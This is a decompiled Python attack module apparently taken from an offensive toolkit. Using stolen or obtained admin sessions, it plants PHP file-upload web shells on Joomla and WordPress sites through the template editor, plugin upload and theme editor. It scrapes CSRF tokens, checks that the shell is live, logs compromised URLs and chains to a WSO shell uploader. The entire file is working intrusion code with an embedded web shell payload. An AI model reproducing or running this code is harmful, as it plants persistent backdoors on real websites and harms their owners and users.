# uncompyle6 version 2.11.5
# Python bytecode 2.7 (62211)
# Decompiled from: Python 2.7.18 (default, Apr 20 2020, 20:30:41) 
# [GCC 9.3.0]
# Embedded file name: Tools\shellupload.py
import requests
import re
import base64
import time
from random import sample
from Tools import wsoShellUploaderModule
agent = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/72.0'}
y = time.strftime('%y')
m = time.strftime('%m')
ShellCode = '\n<title>Vuln!! patch it Now!</title><?php echo \'<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">\';echo \'<input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="Upload"></form>\';if( $_POST[\'_upl\'] == "Upload" ) {if(@copy($_FILES[\'file\'][\'tmp_name\'], $_FILES[\'file\'][\'name\'])) { echo \'<b>Shell Uploaded ! :)<b><br><br>\'; }else { echo \'<b>Not uploaded ! </b><br><br>\'; }}?>\n'

def RandomGenerator(lenth):
    return ''.join(sample('abcdefghijklmnopqrstuvwxyz', lenth))


def UploadShellJoomla(url, sess):
    shellName = RandomGenerator(7)
    ShellNameBase64 = base64.b64encode('/' + shellName + '.php')
    try:
        Source = sess.get('http://' + url + '/administrator/index.php?option=com_templates&view=templates', headers=agent, timeout=7)
        S = re.findall('<td class="template-name">\n\t\t\t\t\t\t<a href="(.*)">', str(Source.content))[0]
        if '&amp' in S:
            ThemeURL = str(S).replace('&amp;', '&')
        else:
            ThemeURL = S
        Source2 = sess.get('http://' + url + ThemeURL, headers=agent, timeout=7)
        try:
            TokeN = re.findall('{"csrf.token":"(.*)",', str(Source2.content))[0].split('"')[0]
        except:
            TokeN = re.findall('<input type="hidden" name="(.*)" value="1" />', str(Source2.content))[0]

        ThemeID = re.findall('option=com_templates&view=template&id=(.*)&file=aG9tZQ==', ThemeURL)[0]
        POSTpar = {'option': 'com_templates',
           'task': 'template.createFile',
           'id': str(ThemeID),
           'file': 'aG9tZQ'
           }
        POSTData = {'name': shellName,
           'type': 'php',
           'address': '',
           str(TokeN): 1
           }
        POST = sess.post('http://' + url + '/administrator/index.php', params=POSTpar, data=POSTData, headers=agent, timeout=7)
        if 'class="alert alert-success"' in str(POST.content):
            par = {'option': 'com_templates','view': 'template',
               'id': str(ThemeID),
               'file': ShellNameBase64
               }
            Data = {'jform[source]': ShellCode,
               'task': 'template.apply',
               'jform[filename]': '/{}.php'.format(shellName),
               'jform[extension_id]': str(ThemeID),
               str(TokeN): 1
               }
            SAVE = sess.post('http://' + url + '/administrator/index.php', params=par, data=Data, headers=agent, timeout=7)
            if 'class="alert alert-success"' in str(SAVE.content):
                CheckUp = sess.get('http://' + '{}/templates/beez3/{}.php'.format(url, shellName), timeout=9, headers=agent)
                if '<title>Vuln!! patch it Now!</title>' in str(CheckUp.content):
                    with open('result/Shell_results.txt', 'a') as writer:
                        writer.write('{}/templates/beez3/{}.php\n'.format(url, shellName))
                    wsoShellUploaderModule.UploadWso2('{}/templates/beez3/{}.php'.format(url, shellName))
    except:
        pass


def UploadshellWordpress(url, session):
    global GETThemeName
    SHELLSTATUS = False
    if '/' in url:
        HOST = url.split('/')[0]
    else:
        HOST = url
    shellName = RandomGenerator(7)
    WordpressHeader = {'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
       'Accept-Encoding': 'gzip, deflate',
       'Accept-Language': 'en-US,en;q=0.5',
       'Connection': 'keep-alive',
       'Host': HOST,
       'Referer': 'http://{}/wp-admin/plugins.php'.format(url),
       'Upgrade-Insecure-Requests': '1',
       'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0'
       }
    WordpressShellUploadHeader = {'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
       'Accept-Encoding': 'gzip, deflate',
       'Accept-Language': 'en-US,en;q=0.5',
       'Connection': 'keep-alive',
       'Host': HOST,
       'Referer': 'http://{}/wp-admin/plugin-install.php'.format(url),
       'Upgrade-Insecure-Requests': '1',
       'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0'
       }
    try:
        Source = session.get('http://' + url + '/wp-admin/plugin-install.php?tab=upload', headers=WordpressHeader, timeout=7)
        try:
            WHR = re.findall('name="_wp_http_referer" value="(.*)"', str(Source.content))[0].split('"')[0]
        except:
            WHR = '/wp-admin/plugin-install.php?tab=upload'

        try:
            wpNonce = re.findall('<input type="hidden" id="_wpnonce" name="_wpnonce" value="(.*?)"', str(Source.content))[0]
            PostData = {'_wpnonce': wpNonce,
               '_wp_http_referer': WHR,
               'filename': '{}.php'.format(shellName)
               }
        except:
            wpNonce = re.findall('<input type="hidden" id="nonce" name="nonce" value="(.*?)"', str(Source.content))[0]
            PostData = {'nonce': wpNonce,
               '_wp_http_referer': WHR,
               'filename': '{}.php'.format(shellName)
               }

        PostFile = {'pluginzip': ['{}.php'.format(shellName), ShellCode]}
        session.post('http://' + url + '/wp-admin/update.php?action=upload-plugin', files=PostFile, data=PostData, headers=WordpressShellUploadHeader)
    except:
        pass

    if SHELLSTATUS == True:
        pass
    else:
        WordpressHeader2 = {'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
           'Accept-Encoding': 'gzip, deflate',
           'Accept-Language': 'en-US,en;q=0.5',
           'Connection': 'keep-alive',
           'Cache-Control': 'max-age=0',
           'Host': HOST,
           'Upgrade-Insecure-Requests': '1',
           'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0'
           }
        WordpressShellUploadHeader2 = {'Accept': '*/*',
           'Accept-Encoding': 'gzip, deflate',
           'Accept-Language': 'en-US,en;q=0.5',
           'Connection': 'keep-alive',
           'Host': HOST,
           'Origin': 'http://{}'.format(HOST),
           'Referer': 'http://{}/wp-admin/theme-editor.php?file=search.php'.format(url),
           'Upgrade-Insecure-Requests': '1',
           'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0',
           'X-Requested-With': 'XMLHttpRequest'
           }
        try:
            S = session.get('http://' + url + '/wp-admin/theme-editor.php?file=search.php', headers=WordpressHeader2, timeout=7)
            GETThemeName = re.findall('<option value="(.*)" selected="selected"', str(S.content))[0]
            try:
                wpNonce = re.findall('<input type="hidden" id="_wpnonce" name="_wpnonce" value="(.*?)"', str(S.content))[0]
                Submitbut = re.findall('id="submit" class="button button-primary" value="(.*)"', str(S.content))[0]
                if ' ' in Submitbut:
                    Submitbut = str(Submitbut).replace(' ', '+')
                Pdata = {'_wpnonce': wpNonce,'_wp_http_referer': '/wp-admin/theme-editor.php?file=search.php&theme={}&scrollto=0'.format(GETThemeName),
                   'newcontent': ShellCode,
                   'action': 'update',
                   'file': 'search.php',
                   'theme': GETThemeName,
                   'submit': Submitbut
                   }
            except:
                wpNonce = re.findall('<input type="hidden" id="nonce" name="nonce" value="(.*?)"', str(S.content))[0]
                Pdata = {'nonce': wpNonce,
                   '_wp_http_referer': '/wp-admin/theme-editor.php?file=search.php&theme={}'.format(GETThemeName),
                   'newcontent': ShellCode,
                   'action': 'edit-theme-plugin-file',
                   'file': 'search.php',
                   'theme': GETThemeName,
                   'docs-list': ''
                   }
                session.post('http://' + url + '/wp-admin/admin-ajax.php', headers=WordpressShellUploadHeader2, data=Pdata, timeout=7)

        except:
            pass

        try:
            CheckShell = session.get('http://' + url + '/wp-content/themes/{}/search.php'.format(GETThemeName), timeout=10, headers=agent)
            CheckShell2 = session.get('http://' + url + '/wp-content/uploads/20{}/{}/{}.php'.format(str(y), str(m), shellName), timeout=10, headers=agent)
            if 'Vuln!! patch it Now!</title><form action="" method="post"' in str(CheckShell.content):
                with open('result/Shell_results.txt', 'a') as writer:
                    writer.write(url + '/wp-content/themes/{}/search.php'.format(GETThemeName) + '\n')
                wsoShellUploaderModule.UploadWso2(url + '/wp-content/themes/{}/search.php'.format(GETThemeName))
            elif 'Vuln!! patch it Now!</title><form action="" method="post"' in str(CheckShell2.content):
                with open('result/Shell_results.txt', 'a') as writer:
                    writer.write('{}/wp-content/uploads/20{}/{}/{}.php\n'.format(url, str(y), str(m), shellName))
                wsoShellUploaderModule.UploadWso2('{}/wp-content/uploads/20{}/{}/{}.php'.format(url, str(y), str(m), shellName))
        except:
            pass